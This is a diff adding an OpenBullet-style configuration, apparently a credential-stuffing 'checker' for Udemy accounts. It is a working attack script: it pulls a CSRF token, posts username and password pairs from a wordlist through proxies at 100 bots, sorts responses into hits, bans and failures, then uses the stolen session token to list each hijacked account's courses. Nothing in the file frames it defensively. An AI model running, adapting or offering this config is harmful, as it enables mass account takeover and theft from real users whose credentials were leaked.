@@ -1,0 +1,64 @@
+[SETTINGS]
+{
+  "Name": "Udemy",
+  "SuggestedBots": 100,
+  "LastModified": "2019-04-19T22:45:53.8754878+02:00",
+  "AdditionalInfo": "",
+  "Author": "INFINITEY",
+  "Version": "1.0.0",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#GET_CSRF REQUEST GET "https://www.udemy.com/join/login-popup/?display_type=popup&next=https://www.udemy.com/&locale=en_US&ref=&xref=&response_type=json" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+#PARSE_CSRF PARSE "<SOURCE>" LR "csrfmiddlewaretoken' value='" "'" -> VAR "CSRF" 
+#LOGIN REQUEST POST "https://www.udemy.com/join/login-popup/?display_type=popup&next=https://www.udemy.com/&locale=en_US&ref=&xref=&response_type=json" 
+  CONTENT "csrfmiddlewaretoken=<CSRF>&locale=en_US&email=<USER>&password=<PASS>&submit=Login" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "referer: https://www.udemy.com/join/login-popup/?display_type=popup&next=https://www.udemy.com/&locale=en_US&ref=&xref=&response_type=json" 
+KEYCHECK 
+  KEYCHAIN Ban OR 
+    KEY "You have exceeded the maximum number of requests per hour" 
+  KEYCHAIN Success OR 
+    KEY "{\"returnUrl\": \"https://www.udemy.com/\"}" 
+  KEYCHAIN Failure OR 
+    KEY "Enter a valid email address." 
+    KEY "Please check your email and password." 
+#PARSE_ACCTOKEN PARSE "<COOKIES(access_token)>" LR "" "" -> VAR "ACCTOKEN" 
+REQUEST GET "https://www.udemy.com/api-2.0/users/me/subscribed-courses?fields%5Bcourse%5D=@min,visible_instructors,image_480x270,favorite_time,archive_time,completion_ratio,last_accessed_time,enrollment_time,features,num_collections&fields%5Buser%5D=@min,job_title&ordering=-access_time,-enrolled&page=1&page_size=100" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "referer: https://www.udemy.com/" 
+  HEADER "X-Udemy-Authorization: Bearer <ACCTOKEN>" 
+  HEADER "Authorization: Bearer <ACCTOKEN>" 
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "{\"count\":" 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "{\"count\": 0," 
+#CAPTURE_Total_Courses PARSE "<SOURCE>" LR "count\": " "," -> CAP "Total Courses" "|" "|" 
+#CAPTURE_TITLES PARSE "<SOURCE>" LR "url\": \"/" "/learn" -> CAP "Courses" "" "|" 
